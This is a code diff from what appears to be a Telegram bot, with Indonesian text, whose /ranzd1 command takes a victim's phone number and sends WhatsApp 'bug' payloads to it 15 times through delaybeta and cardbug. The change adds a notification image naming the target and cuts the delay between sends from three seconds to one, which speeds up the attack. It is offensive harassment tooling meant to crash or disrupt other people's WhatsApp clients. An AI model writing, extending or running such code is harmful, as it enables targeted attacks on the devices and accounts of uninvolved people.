@@ -4984,18 +4984,25 @@ bot.onText(/\/ranzd1(?:\s(.+))?/, async (msg, match) => {
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
     if (!/^\d+$/.test(numberTarget)) {
-        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /system 62×××.");
+        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /ranzd1 62×××.");
     }
 
     const formatedNumber = numberTarget + "@s.whatsapp.net";
 
     // Kirim notifikasi awal dengan gambar
+    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
+        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
+┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
+┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
+┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
+    });
     // Proses pengiriman bug
     for (let i = 0; i < 15; i++) { // Kirim 3 kali langsung
         await delaybeta(formatedNumber);
-        await sleep(3000)
+        await sleep(1000)
         await cardbug(formatedNumber);
-        await sleep(3000)
+        await sleep(1000)
         console.log(chalk.red("Send Bug Succes"))
     }
 
